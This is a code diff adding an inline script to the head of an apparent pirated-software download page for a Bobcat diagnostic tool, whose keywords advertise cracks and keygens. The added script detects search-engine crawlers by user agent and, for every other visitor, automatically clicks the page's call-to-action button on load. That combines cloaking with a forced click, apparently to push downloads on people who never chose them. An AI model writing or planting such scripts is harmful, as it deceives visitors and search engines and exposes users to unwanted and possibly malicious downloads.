@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bobcat Service Analyzer 92.02 Development 02.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Bobcat Service Analyzer 92.02 Development 02.2024 for diagnostics and calibration. Supports Windows 10 in multiple languages.">
     <meta name="keywords" content="Bobcat Service Analyzer 92.02 Development 02.2024, Bobcat Service Analyzer 92.02 download, Bobcat Service Analyzer 92.02 free download, Bobcat Service Analyzer 2024, Bobcat Service Analyzer download free, Bobcat diagnostic software, Bobcat diagnostic software download, Bobcat diagnostic software free, Bobcat diagnostic software crack, Bobcat diagnostic software keygen, Bobcat calibration software, Bobcat programming software free download, Bobcat equipment diagnostics, Bobcat technical information, Bobcat diagnostic tools 2024, Bobcat Service Analyzer Czech, Bobcat Service Analyzer German, Bobcat Service Analyzer English, Bobcat Service Analyzer Spanish, Bobcat Service Analyzer French, Bobcat Service Analyzer Italian, Bobcat Service Analyzer Korean, Bobcat Service Analyzer Portuguese, Bobcat Service Analyzer Russian, Bobcat Service Analyzer Simplified Chinese">
     <style>
